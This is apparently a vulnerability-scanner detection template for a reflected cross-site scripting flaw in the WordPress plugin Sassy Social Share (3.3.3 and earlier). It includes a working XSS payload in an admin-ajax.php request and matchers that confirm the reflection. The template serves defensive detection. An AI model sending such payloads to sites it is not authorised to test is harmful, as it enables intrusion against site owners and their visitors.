id: "sassy-social-share-xss"
name: "Sassy Social Share <=3.3.3 - Cross-Site Scripting"
severity: "medium"
description: "WordPress Sassy Social Share 3.3.3 and prior is vulnerable to cross-site scripting because certain AJAX endpoints return JSON data with no Content-Type header set and then use the default text/html. In other words, any JSON that has HTML will be rendered as such."
tech:
  - "wordpress"
  - "php"
tags:
  - "xss"
  - "wp"
  - "wpscan"
  - "wordpress"
  - "wp-plugin"
  - "sassy"
  - "vuln"
cwe: "CWE-80"
reference: "https://wpscan.com/vulnerability/4631519b-2060-43a0-b69b-b3d7ed94c705"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]="
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "[{\"<img src=x onerror=alert(document.domain)>\":\"\"}]"
      - "facebook"
      - "twitter"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "application/json"
    negative: true
  - type: "status"
    status:
      - 200
